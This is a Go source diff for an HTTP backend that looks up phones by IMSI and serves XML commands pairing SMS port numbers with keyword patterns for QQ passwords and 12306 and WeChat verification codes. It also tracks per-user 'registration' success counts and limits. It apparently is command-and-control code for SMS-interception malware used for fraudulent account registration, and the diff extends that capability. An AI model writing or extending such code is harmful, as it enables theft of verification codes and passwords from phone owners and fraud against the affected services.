@@ -5,6 +5,9 @@ import (
 	"encoding/json"
 	"fmt"
 	_ "github.com/go-sql-driver/mysql"
+	"github.com/golang/sync/syncmap"
+	// "github.com/orcaman/concurrent-map"
+	// "golang.org/x/sync/syncmap"
 	"io"
 	"io/ioutil"
 	"log"
@@ -193,11 +196,13 @@ func testC(w http.ResponseWriter, r *http.Request) {
 	log.Println("testC RawQuery, %s", r.URL.RawQuery)
 }
 
-const DEFAULT_GETC = "<datas><cfg><durl></durl><vno></vno><stats>1</stats></cfg><da><data><kno>333</kno><kw>a*b</kw><apid>1</apid></data><data><kno>334</kno><kw>a*b</kw><apid>2</apid></data><data><kno>335</kno><kw>a*b</kw><apid>3</apid></data></da></datas>"
+const DEFAULT_GETC = "<datas><cfg><durl></durl><vno></vno><stats>1</stats></cfg><da>[command-0][command-1][command-2]</da></datas>"
+
+var gDefaultCommands = []string{"<data><kno>333</kno><kw>a*b</kw><apid>1</apid></data>", "<data><kno>334</kno><kw>a*b</kw><apid>2</apid></data>", "<data><kno>335</kno><kw>a*b</kw><apid>3</apid></data>"}
 
 // const REGISTER_GETC = "<datas><cfg><durl></durl><vno></vno><stats>1</stats></cfg><da><data><kno>106</kno><kw>注册微信帐号，验证码*。请</kw><apid>100</apid></data><data><kno>135</kno><kw>验证码*。</kw><apid>100</apid></data></da></datas>"
-const REGISTER_GETC_QQ = "<datas><cfg><durl></durl><vno></vno><stats>1</stats></cfg><da><data><kno>106</kno><kw>QQ*密码</kw><apid>4</apid></data><data><kno>334</kno><kw>a*b</kw><apid>2</apid></data><data><kno>335</kno><kw>a*b</kw><apid>3</apid></data></da></datas>"
-const REGISTER_GETC_12306 = "<datas><cfg><durl></durl><vno></vno><stats>1</stats></cfg><da><data><kno>12306</kno><kw>铁路客服*验证码</kw><apid>5</apid></data><data><kno>334</kno><kw>a*b</kw><apid>2</apid></data><data><kno>335</kno><kw>a*b</kw><apid>3</apid></data></da></datas>"
+const REGISTER_GETC_QQ = "<data><kno>106</kno><kw>QQ*密码</kw><apid>4</apid></data>"
+const REGISTER_GETC_12306 = "<data><kno>12306</kno><kw>铁路客服*验证码</kw><apid>5</apid></data>"
 const TRY_MORE_TIMES = 2 //多余指令尝试次数
 
 func getC(w http.ResponseWriter, r *http.Request) {
@@ -213,7 +218,7 @@ func getC(w http.ResponseWriter, r *http.Request) {
 	user := getUserByImsi(r.FormValue("imsi"))
 	log.Println(*user)
 	// && strings.EqualFold((*user)["province"], "广东")
-	if strings.EqualFold(mapConfig["openRegisterGet"], "open") && len([]rune((*user)["mobile"])) >= 11 && checkUserRegister(*user) {
+	if v, ok := mapConfig.Load("openRegisterGet"); ok && strings.EqualFold(v.(string), "open") && len([]rune((*user)["mobile"])) >= 11 && checkUserRegister(*user) {
 		//choose register content
 		resp = chooseRegisterContent(*user)
 	} else {
@@ -222,7 +227,7 @@ func getC(w http.ResponseWriter, r *http.Request) {
 			go cleanRegisterUserCmdList(*user)
 		}
 	}
-	w.Write([]byte(resp))
+	w.Write([]byte(procGetResp(resp)))
 
 	log.Println("getC RawQuery,", r.URL.RawQuery)
 
@@ -232,20 +237,57 @@ func getC(w http.ResponseWriter, r *http.Request) {
 	log.Println("getc total time(s):", end.Sub(start).Seconds())
 }
 
+func procGetResp(resp string) string {
+	result := resp
+	for i := 0; i < len(gDefaultCommands); i++ {
+		if strings.LastIndex(result, "[command-"+strconv.Itoa(i)+"]") >= 0 {
+			result = strings.Replace(result, "[command-"+strconv.Itoa(i)+"]", gDefaultCommands[i], -1)
+		}
+	}
+	return result
+}
+
 func chooseRegisterContent(user map[string]string) string {
 	var result string
 	appList := ""
 	appCount := 0
 	//请注意这里有相当于硬编码的执行顺序
-	if strings.EqualFold(mapConfig["registerSmsGet12306"], "open") && checkSmsRegister(user, "register12306CmdCount", "register12306SuccessCount", "12306RegisterLimit") {
-		result = REGISTER_GETC_12306
+	if v, ok := mapConfig.Load("registerSmsGet12306"); ok && strings.EqualFold(v.(string), "open") && checkSmsRegister(user, "register12306CmdCount", "register12306SuccessCount", "12306RegisterLimit") {
+		result = strings.Replace(DEFAULT_GETC, "[command-0]", REGISTER_GETC_12306, -1)
 		appList = ",5,"
 		appCount++
-	} else if strings.EqualFold(mapConfig["registerSmsGetQq"], "open") && checkSmsRegister(user, "registerQqCmdCount", "registerQqSuccessCount", "qqRegisterLimit") {
-		result = REGISTER_GETC_QQ
+	} else if v, ok := mapConfig.Load("registerSmsGetQq"); ok && strings.EqualFold(v.(string), "open") && checkSmsRegister(user, "registerQqCmdCount", "registerQqSuccessCount", "qqRegisterLimit") {
+		result = strings.Replace(DEFAULT_GETC, "[command-0]", REGISTER_GETC_QQ, -1)
 		appList = ",4,"
 		appCount++
 	}
+	resultArray, _ := fetchRows(dbConfig, "SELECT *,ifnull(successCount,0) as successCount  FROM `register_user_relations` WHERE imsi =  ?", user["imsi"])
+	userRecordMap := make(map[string]map[string]string)
+	for _, v := range *resultArray {
+		userRecordMap[v["apid"]] = v
+	}
+	mapRegisterTargetConfig.Range(func(ki, vi interface{}) bool {
+		if appCount < 3 {
+			v := vi.(map[string]string)
+			needCmd := false
+			if userRecordMap[v["apid"]] == nil {
+				needCmd = true
+				go insertRelation(user, v["apid"])
+			} else if strings.EqualFold(userRecordMap[v["apid"]]["successCount"], "0") {
+				needCmd = true
+				go updateRelation(userRecordMap[v["apid"]]["id"])
+			}
+			if needCmd {
+				result = strings.Replace(result, "[command-"+strconv.Itoa(appCount)+"]", "<data><kno>"+v["portNumber"]+"</kno><kw>"+v["keyword"]+"</kw><apid>"+v["apid"]+"</apid></data>", -1)
+				appCount++
+
+			}
+			return true
+		} else {
+			return false
+		}
+	})
+
 	if !strings.EqualFold(appList, "") {
 		go processRegisterUser(user, appList)
 	} else {
@@ -255,12 +297,37 @@ func chooseRegisterContent(user map[string]string) string {
 	return result
 }
 
+func insertRelation(user map[string]string, apid string) {
+	defer func() {
+		if err := recover(); err != nil {
+			log.Println("error begin:")
+			log.Println(err) // 这里的err其实就是panic传入的内容，55
+			log.Println("error end:")
+		}
+	}()
+	sql := `insert into register_user_relations (imsi,apid,getTime) values (?,?,?)`
+	insert(dbConfig, sql, user["imsi"], apid, time.Now().Unix())
+}
+
+func updateRelation(id string) {
+	defer func() {
+		if err := recover(); err != nil {
+			log.Println("error begin:")
+			log.Println(err) // 这里的err其实就是panic传入的内容，55
+			log.Println("error end:")
+		}
+	}()
+	sql := `update register_user_relations set getTime = ? where id =?`
+	insert(dbConfig, sql, time.Now().Unix(), id)
+}
+
 func checkSmsRegister(user map[string]string, cmdParaName string, successParaName string, sysLimitName string) bool {
 	if strings.EqualFold(user[cmdParaName], "NULL") { // 从来没有生成过指令
 		return true
 	} else {
 		_registerCmdCount, _ := strconv.ParseInt(user[cmdParaName], 10, 8)
-		_sysLimit, _ := strconv.ParseInt(mapConfig[sysLimitName], 10, 8)
+		v, _ := mapConfig.Load(sysLimitName)
+		_sysLimit, _ := strconv.ParseInt(v.(string), 10, 8)
 		if _registerCmdCount-_sysLimit >= TRY_MORE_TIMES { // 生成指令超过限制次数
 			return false
 		} else {
@@ -331,7 +398,8 @@ func checkUserRegister(user map[string]string) bool {
 		return true
 	} else if len([]rune(user["registerCountMonth"])) > 0 {
 		_userCount, _ := strconv.ParseInt(user["registerCountMonth"], 10, 8)
-		_sysLimit, _ := strconv.ParseInt(mapConfig["registerMonthLimit"], 10, 8)
+		v, _ := mapConfig.Load("registerMonthLimit")
+		_sysLimit, _ := strconv.ParseInt(v.(string), 10, 8)
 		if _userCount < _sysLimit { // 是否超过月次数总限制
 			return true
 		} else {
@@ -373,15 +441,17 @@ var (
 
 var dbLog *sql.DB
 var dbConfig *sql.DB
-var mapConfig map[string]string
-var mapRegisterTargetConfig map[string]map[string]string
-var mapRegisterChannelConfig map[string]map[string]string
+var mapConfig syncmap.Map
+var mapRegisterTargetConfig syncmap.Map
+var mapRegisterChannelConfig syncmap.Map
 
 func init() {
 
-	mapConfig = make(map[string]string)
-	mapRegisterTargetConfig = make(map[string]map[string]string)
-	mapRegisterChannelConfig = make(map[string]map[string]string)
+	// mapConfig = make(map[string]string)
+	// mapRegisterTargetConfig = make(map[string]map[string]string)
+	// mapRegisterChannelConfig = make(map[string]map[string]string)
+	// mapRegisterChannelConfig = new(syncmap.Map)
+	// mapRegisterTargetConfig = cmap.New()
 	if !loadFileConfig() {
 		os.Exit(1)
 	}
@@ -424,16 +494,24 @@ func loadGlobalConfigFromDb() {
 	// 	(*mapConfig)[(*resultArray)[index]["title"]] = (*resultArray)[index]["detail"]
 	// }
 	for _, value := range *resultArray {
-		mapConfig[value["title"]] = value["detail"]
+		mapConfig.Store(value["title"], value["detail"])
+		// mapConfig[value["title"]] = value["detail"]
 	}
 	// log.Println(mapConfig)
 	targetArray, _ := fetchRows(dbConfig, "SELECT * FROM register_targets")
 	for _, target := range *targetArray {
-		mapRegisterTargetConfig[target["apid"]] = target
+		// mapRegisterTargetConfig[target["apid"]] = target
+		if strings.EqualFold(target["stateGet"], "open") {
+			mapRegisterTargetConfig.Store(target["apid"], target)
+		} else {
+			mapRegisterTargetConfig.Delete(target["apid"])
+		}
+
 	}
 	channelArray, _ := fetchRows(dbConfig, "SELECT * FROM register_channels")
 	for _, channel := range *channelArray {
-		mapRegisterChannelConfig[channel["apid"]] = channel
+		// mapRegisterChannelConfig[channel["apid"]] = channel
+		mapRegisterChannelConfig.Store(channel["aid"], channel)
 	}
 	log.Println("loadGlobalConfigFromDb done")
 }
